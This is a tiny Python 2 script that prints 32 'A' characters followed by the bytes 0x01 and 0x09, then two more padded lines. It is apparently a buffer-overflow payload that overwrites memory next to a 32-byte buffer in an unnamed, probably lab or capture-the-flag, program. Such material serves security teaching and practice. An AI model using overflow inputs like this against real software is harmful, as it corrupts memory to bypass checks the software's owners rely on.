#!/usr/bin/python2

import sys

As = 'A' * 32


sys.stdout.write(As + '\x01\x09\n')
sys.stdout.write(As + '\n')
sys.stdout.write(As + '\n')
